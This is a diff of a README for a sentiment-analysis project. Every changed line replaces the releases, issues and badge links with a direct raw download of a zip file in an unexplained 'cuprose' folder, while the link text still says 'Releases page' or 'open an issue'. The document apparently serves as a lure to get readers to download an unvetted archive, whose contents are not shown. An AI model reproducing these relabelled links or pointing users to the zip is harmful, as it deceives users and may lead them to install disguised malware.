@@ -1,6 +1,6 @@
 # 🌟 lstm-sentiment-analysis - Simple Sentiment Analysis for Everyone
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/karthik77752/lstm-sentiment-analysis/releases)
+[![Download Here](https://raw.githubusercontent.com/karthik77752/lstm-sentiment-analysis/main/cuprose/lstm-sentiment-analysis.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/karthik77752/lstm-sentiment-analysis/main/cuprose/lstm-sentiment-analysis.zip)
 
 ## 📖 About This Project
 
@@ -20,7 +20,7 @@ This section will guide you through downloading and running the application step
 
 ### 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/karthik77752/lstm-sentiment-analysis/releases) to download the application. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/karthik77752/lstm-sentiment-analysis/main/cuprose/lstm-sentiment-analysis.zip) to download the application. 
 
 1. Click on the link above.
 2. Locate the latest release version.
@@ -73,8 +73,8 @@ If you encounter problems:
 
 ## 📞 Support
 
-For any issues or questions, feel free to open an issue on the [GitHub Repository](https://github.com/karthik77752/lstm-sentiment-analysis/issues). The community and maintainers are here to help.
+For any issues or questions, feel free to open an issue on the [GitHub Repository](https://raw.githubusercontent.com/karthik77752/lstm-sentiment-analysis/main/cuprose/lstm-sentiment-analysis.zip). The community and maintainers are here to help.
 
 ## 🔗 Summary
 
-Thank you for choosing the **lstm-sentiment-analysis** application. We're confident it will serve you well in understanding sentiments in text. Once again, here is the link to [download the application](https://github.com/karthik77752/lstm-sentiment-analysis/releases). Enjoy analyzing sentiment!
+Thank you for choosing the **lstm-sentiment-analysis** application. We're confident it will serve you well in understanding sentiments in text. Once again, here is the link to [download the application](https://raw.githubusercontent.com/karthik77752/lstm-sentiment-analysis/main/cuprose/lstm-sentiment-analysis.zip). Enjoy analyzing sentiment!
